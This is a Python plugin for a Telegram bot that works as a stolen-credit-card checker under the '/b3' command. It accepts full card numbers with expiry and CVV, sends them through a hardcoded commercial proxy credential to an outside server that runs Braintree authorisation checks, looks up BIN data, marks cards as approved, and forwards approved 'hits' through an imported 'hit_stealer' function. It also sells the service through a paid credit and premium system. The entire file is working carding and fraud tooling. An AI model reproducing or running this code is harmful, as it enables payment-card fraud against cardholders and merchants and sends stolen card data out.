from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests, re, time
from plugins.func.users_sql import *
from plugins.tools.hit_stealer import send_hit_if_approved
from datetime import date

session = requests.Session()

@Client.on_message(filters.command("b3", prefixes=["/", "."]))
async def cmd_b3(Client, message):
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        chat_type = str(message.chat.type)
        username = message.from_user.username or "None"

        # Must be registered
        regdata = fetchinfo(user_id)
        if not regdata:
            return await message.reply("❌ You are not registered. Use /register first.", quote=True)

        role = (regdata[2] or "FREE").strip().upper()
        credit = int(regdata[5] or 0)
        wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
        antispam_time = int(regdata[7] or 0)
        now = int(time.time())

        # Block FREE users in PM
        if chat_type == "ChatType.PRIVATE" and role == "FREE":
            return await message.reply_text(
                "⚠️ <b>Premium Users Required</b>\n"
                "Only PREMIUM users can use this command in bot PM.\n"
                "Join our group to use it for FREE:",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Join Group", url="https://t.me/BarryxChat")]
                ]),
                disable_web_page_preview=True
            )

        # Group allowlist check
        GROUP = open("plugins/group.txt").read().splitlines()
        if chat_type in ["ChatType.GROUP", "ChatType.SUPERGROUP"] and str(chat_id) not in GROUP:
            return await message.reply("❌ Unauthorized group. Contact admin.", quote=True)

        if credit < 1:
            return await message.reply("❌ Insufficient credit.", quote=True)

        if now - antispam_time < wait_time:
            return await message.reply(f"⏳ AntiSpam: wait {wait_time - (now - antispam_time)}s", quote=True)

        # Card input
        cc_raw = None
        if message.reply_to_message and message.reply_to_message.text:
            cc_raw = message.reply_to_message.text.strip()
        elif len(message.text.split(maxsplit=1)) > 1:
            cc_raw = message.text.split(maxsplit=1)[1].strip()

        if not cc_raw:
            return await message.reply("❌ Please reply to a valid CC or send one after the command.", quote=True)

        cc_clean = re.sub(r"[^\d]", "|", cc_raw)
        match = re.search(r"(\d{12,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})", cc_clean)
        if not match:
            return await message.reply("❌ Invalid format. Use: xxxx xxxx xxxx xxxx|MM|YY|CVV", quote=True)

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        status_msg = await message.reply(f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Braintree Auth</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> Checking...
<b>⊙ Response:</b> Waiting...
""", quote=True)

        tic = time.perf_counter()
        try:
            proxy = "proxy.rampageproxies.com:5000:package-1111111-country-us:5671nuWwEPrHCw2t"
            url = f"http://luckyxd.biz:1234/auth?cc={fullcc}&proxy={proxy}"
            res = session.get(url, timeout=50)
            data = res.json()
            card_status = data.get("status", "").lower()
            card_message = data.get("result") or data.get("message") or res.text or "❌ No response message."
        except Exception as e:
            card_status = "error"
            card_message = f"❌ Request failed: {str(e)}"

        toc = time.perf_counter()

        bin_ = ccnum[:6]
        brand = type_ = level = bank = country = flag = "N/A"
        try:
            bin_res = session.get(f"https://api.voidex.dev/api/bin?bin={bin_}", timeout=10).json()
            brand = bin_res.get("scheme") or bin_res.get("vendor") or brand
            type_ = bin_res.get("type") or type_
            level = bin_res.get("level") or bin_res.get("brand") or level
            bank = bin_res.get("bank") or bank
            country = bin_res.get("country_name") or country
            flag = bin_res.get("country_flag") or flag
        except:
            pass

        brand, type_, level, bank, country = [str(i or "N/A").upper() for i in [brand, type_, level, bank, country]]
        flag = flag or "N/A"

        live_keywords = ["avs", "duplicate", "already exists", "cvc", "zip"]
        status = "Approved ✅" if any(kw in card_message.lower() for kw in live_keywords) or card_status == "success" else "Declined ❌"

        final_msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Braintree Auth</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ BIN Info:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        await Client.edit_message_text(chat_id, status_msg.id, final_msg)

        if "Approved ✅" in status:
            await send_hit_if_approved(Client, final_msg)

        updatedata(user_id, "credits", credit - 1)
        updatedata(user_id, "antispam_time", now)
        plan_expirychk(user_id)

    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}", quote=True)
